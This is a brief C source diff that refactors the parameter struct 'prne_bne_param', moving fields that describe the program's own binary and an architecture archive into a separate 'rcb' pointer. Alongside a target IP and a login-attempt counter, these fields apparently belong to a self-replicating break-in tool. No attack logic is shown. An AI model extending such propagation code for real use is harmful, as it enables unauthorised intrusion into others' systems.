@@ -40,15 +40,7 @@ struct prne_bne_param {
 		void (*exit_dd)(void *ctx);
 	} cb;
 	void *cb_ctx;
-	struct {
-		const uint8_t *m_self;
-		size_t self_len;
-		size_t exec_len;
-		const uint8_t *m_dv;
-		size_t dv_len;
-		const prne_bin_archive_t *ba;
-		prne_arch_t self;
-	} rcb;
+	const prne_rcb_param_t *rcb;
 	prne_ip_addr_t subject;
 	unsigned int login_attempt;
 };
